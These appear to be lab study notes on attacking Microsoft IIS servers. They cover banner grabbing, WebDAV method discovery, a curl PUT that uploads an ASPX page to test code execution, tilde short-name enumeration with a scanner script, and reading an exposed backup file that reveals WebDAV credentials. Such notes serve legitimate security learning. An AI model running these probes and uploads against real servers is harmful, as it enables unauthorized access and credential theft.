# Web Server Attacks II

## Introduction

IIS - Internet Information Services (microsoft web server)
IIS is connected to other important Window services.

One of the attacks to the IIS was completed by Lazarus Group in 2023. They got initial access and distributed malware(AhnLab ASEC 2023)

## IIS fingerprint and enumeration

IIS web server version shows which CVE to apply.
WebDAV ---> direct file upload path.
HTTP methods that server accepts tells what operation is possible.

### IIS version and info

Many IIS web server users do not versions that are note secured.
IIS 6.0 - 10.0 (7.0, 7.5, 8.0, 8.5)

Look for IIS web server version CVE.

### IIS Architecture

There are layers in the IIS web server.

1. HTTP.sys
2. W3SVC/WAS
3. w3wp.exe
4. ASP/NET runtime/handler mappings
5. Application code

HTTP.sys - is a kernel mode driver that accept http traffic before other IIS process interacts with it.
Application pools --> run their own process w3wp.exe.

### HTTP Banner Grabber

IIS includes Server header for every response with product and version

command:

`curl -I http://MACHINE_IP`

output:

`HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Mon, 13 Apr 2026 14:05:52 GMT
Accept-Ranges: bytes
ETag: "d5e75da34ecbdc1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 25 Apr 2026 09:02:04 GMT`

Server ---> gives you version
X-Powered-By ---> gives you .Net application hosting
X-AspNet-Version ---> gives you the version of framework

### WebDAV Detection with OPTIONS

WebDAV ---> Web Distributed Authoring Versioning --- a set of extensions to the HTTP protocol.

HTTP OPTIONS methods helps you grab allowed methods

example:

command:

`curl -X OPTIONS http://Target_IP -sv 2>&1 | grep -E "Allow:|DAV:"`

output:

`Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
DAV: 1,2,3
`

### Testing what can be uploaded and run

PUT ---> test file.
GET ---> scan the response.

200 with output - your file is executed
200 without output - your file is served statically

command:

`curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://TARGET_IP/webdav/test.aspx
`
PUT aspx: 401

PUT in the answer says: no write access
Get in the answers says: confirms execution

### Normal vs Suspicious Traffic Patterns

HTTP methods: normal ---> GET POST HEAD /// dangerous ---> OPTIONS returning DAV: PUT MOVE PROPFIND

URl paths: normal ---> static assets /// containing ~ or aspx with writable directories

Status codes: 200, 304, 301, 302, 404 /// 201 or unexpected PUT and DELETE in logs

Server: PRESENT or expected version /// hides or old version of IIS

## IIS Tilde Enumeration

tilde enumeration - is an enumeration technique is the web server have hidden files or hidden admin directory.

### The 8.3 Short Filename Problem

Windows has 8.3 filename format which was inherited from the DOS.

Filename can have no more than 8 characters for name and additional 3 for extension.

BackupFiles becomes -> BACKUP~1
users_backup.xlsx -> USERS\*~1.xls

### How the vulnerability works

IIS will give different responds whether tilde path will be similar or not. detectable.

This technique is different to the bruteforce, as this technique will detect the path from first 6 letters and not from big and vague name.

The recommended mitigation is to disable 8.3 filename creation in the registry.

### Scanning with iis_shortname_scan.py

check the python folder to see iis_shortname_scan.py script.

command:

`python3 iis_shortname_scan.py TARGET_IP`

output:

`Server is vulnerable, please wait, scanning...
[+] /a~1._ [scan in progress]
[+] /b~1._ [scan in progress]
[+] /as~1._ [scan in progress]
[+] /ba~1._ [scan in progress]
[+] /asp~1._ [scan in progress]
[+] /bac~1._ [scan in progress]
[+] /aspn~1._ [scan in progress]
[+] /back~1._ [scan in progress]
[+] /aspne~1._ [scan in progress]
[+] /backu~1._ [scan in progress]
[+] /aspnet~1._ [scan in progress]
[+] /backup~1._ [scan in progress]
[+] /aspnet~1 [scan in progress]
[+] Directory /aspnet~1 [Done]
[+] /backup~1 [scan in progress]
[+] Directory /backup~1 [Done]

---

Dir: /aspnet~1
Dir: /backup~1

---

2 Directories, 0 Files found in total
Note that \* is a wildcard, matches any character zero or more times.`

The script works left to right. First is starts with a~1._ and b~1._ and then extends for one letter.

### What the Short Name Tells You

BACKUP~1/ --- Backup files, sensitive

ADMINI~1/ --- Admin panel, restricted access

CONFIG~1.ASP --- configurational files, can contain credentials

USERS~1.XLS --- User data export, high value target

After this the attacker will go for actual content of discovered resource

### Enumerating the Discovered Directory

After finding the directory scan for files:

`curl http://TARGET_IP/BackupFiles/`

output:

`<html><head><title>10.114.155.95 - /BackupFiles/</title></head><body><H1>10.114.155.95 - /BackupFiles/</H1><hr>

<pre><A HREF="/">[To Parent Directory]</A><br><br> 4/13/2026  2:25 PM           14 <A HREF="/BackupFiles/site-backup.cfg">site-backup.cfg</A><br> 4/25/2026 11:31 AM          168 <A HREF="/BackupFiles/web.config">web.config</A><br> 4/25/2026 11:04 AM           91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre><hr></body></html>`

This command reveals /BackupFiles/webdav_notes.txt directory.

command:

`curl http://TARGET_IP/BackupFiles/webdav_notes.txt`

output:

`WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123`
